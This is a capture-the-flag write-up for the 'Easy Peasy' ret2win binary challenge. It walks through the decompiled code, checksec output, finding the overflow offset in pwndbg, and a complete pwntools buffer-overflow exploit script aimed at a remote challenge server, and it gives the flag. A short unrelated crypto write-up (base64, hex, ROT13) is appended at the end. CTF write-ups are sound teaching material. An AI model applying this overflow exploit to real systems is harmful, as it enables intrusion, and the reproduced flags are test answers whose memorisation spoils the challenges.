# Easy Peasy

## Description

> A super secret piece of information has been hidden behind a program made by
> 1337 hackers.  
> Find this crucial piece of information  
>  
> Author: Anand Rajaram  
>  
> [`ezpz`](https://github.com/JOvenOven/ctf-
> writeups/blob/41d5cb83010eab06422f3673de257b646e0b3066/DeconstruCT.F/binary/easy_peasy/ezpz)

Tags: _binary_ \  
Difficulty: _easy_ \  
Points: _100_

## Solution

When executing the binary, the user is asked to insert a password

```  
$ ./ezpz  
Please enter the super secret password to display the flag:  
password1234  
Invalid password, try again  
```

If we insert a large text, it throws a `Segmentation fault`, which means it is
vulnerable to `buffer overflow` attacks.

```  
$ ./ezpz  
Please enter the super secret password to display the flag:  
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA  
Segmentation fault

```

We can confirm that by opening the binary with a disassembler like `ghidra` in
which we can see three important functions; `main`, `vuln`, and `win`

```c  
undefined8 main(void)

{  
 puts("Please enter the super secret password to display the flag:");  
 fflush((FILE *)stdout);  
 vuln();  
 puts("Invalid password, try again\n");  
 return 0;  
}  
```

```c  
void vuln(void)

{  
 char local_28 [32];

 gets(local_28);  
 return;  
}  
```

```c  
void win(void)

{  
 char local_58 [72];  
 FILE *local_10;

 local_10 = fopen64("flag.txt","r");  
 if (local_10 == (FILE *)0x0) {  
   printf("%s %s","Please create \'flag.txt\' in this directory with
your","own debugging flag.\n")  
   ;  
                   /* WARNING: Subroutine does not return */  
   exit(0);  
 }  
 fgets(local_58,0x40,local_10);  
 printf(local_58);  
 return;  
}  
```

By watching this code we know that this is a classic `ret2win` challenge,
where we have to overwrite the return address with a `buffer overflow` to
execute the `win` function and get the flag.

It is also important to check the security posture of the binary by executing
the command `checksec` to see what kind of vulnerabilities we can exploit.

```shell  
$ checksec ezpz  
   Arch:     amd64-64-little  
   RELRO:    Partial RELRO  
   Stack:    Canary found  
   NX:       NX disabled  
   PIE:      No PIE (0x400000)  
   RWX:      Has RWX segments  
```

According to the output of `checksec`, the security of this binary appears to
be weak. While the binary likely contains a `canary`, it's worth noting that
the canary protection isn't present in the `vuln` function, which is the
specific function we intend to exploit. This indicates that the initial
conditions for the exploit are favorable.

The following steps are the recipe for solving `ret2win` challenges:

1. Determine the offset between the start of the user input and the return address in the stack.  
2. Fill the stack with random data until it reaches the return address.  
3. Overwrite the return address with a `ret` gadget. This gadget redirects the flow of execution to the address of the next function we specify after the gadget, creating a [`ROP chain`](https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/rop-chaining-return-oriented-programming). This step helps avoid potential stack alignment issues.  
4. Incorporate the address of the `win` function into the payload.

To find the offset, I usually use `cyclic`, which is available in the `pwndbg`
plug-in of the `GDB` debugger.

```  
$ gdb ezpz  
...  
pwndbg> cyclic 100  
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa  
pwndbg> run  
```

Copy the 100-character string, then paste it when the program prompts for the
password. It should crash trying to go to the specific memory address in `ret`
(return address) `0x6161616161616166`. Use `cyclic -l <ret_addr>` again to get
the exact offset where we will start overwriting the return address.

```  
pwndbg> cyclic -l 0x6161616161616166  
Finding cyclic pattern of 8 bytes: b'faaaaaaa' (hex: 0x6661616161616161)  
Found at offset 40  
```

I will use the Python library `pwntools` to execute the following steps. Note
that the exploit is encapsulated inside the _"EXPLOIT GOES HERE"_ section. The
remaining code serves as a template, where you should only change the remote
connection parameters with the actual values of your instance.

```Python  
#!/usr/bin/python3  
from pwn import *

# Set up the target binary by specifying the ELF file  
elf = context.binary = ELF("ezpz")

# Defining the GDB script that will be used when running the  
# binary  
gs = '''  
continue  
'''

# Launch the binary with GDB, without GDB or REMOTE based on  
# the command-line arguments  
def start():  
   if args.REMOTE:  
       return remote("3.110.66.92", 31636)  
   else:  
       if args.GDB:  
           return gdb.debug(elf.path, gdbscript=gs)  
       else:  
           return process(elf.path)

io = start()

#============================================================  
#                    EXPLOIT GOES HERE  
#============================================================

# Find a ret gadget  
ret = asm('ret')  
ret = next(elf.search(ret))

# ret address is a padding to avoid stack alignment issues and  
# the main function allows the program to print the flag remotely  
payload = b"A"*40 + p64(ret) + p64(elf.sym.win) + p64(elf.sym.main)

# Send the payload  
io.sendline(payload)

#============================================================

# Interact with the process  
io.interactive()  
```

In my script I added the `main` function at the end of the payload because it
didn't work remotely without it. I am not pretty sure the reason for this
behavior, but I guess it happens because the `win` function does not return
properly, causing the process to finish before it can print the flag. When we
add the `main` function to the payload, the execution proceeds as expected,
resulting in the successful printing of the flag.

Flag `dsc{tH15_N3W_Fl4G_15_aW350M3!}`  

Original writeup (https://github.com/JOvenOven/ctf-
writeups/tree/main/DeconstruCT.F/binary/easy_peasy).## Solution  
Once the provided string is base64 decoded, the result is a string of space-
separated hex values. Decoding the hex values results in a string that looks
like the flag format, but starts with `synt{`. Applying a ROT13 decoding
results in the flag.

## Flag  
**flag{congrats_you_got_me}**

Original writeup
(https://malcrypt.gitlab.io/blog/ctfs/2021/tenable/crypto/easy_peasy/).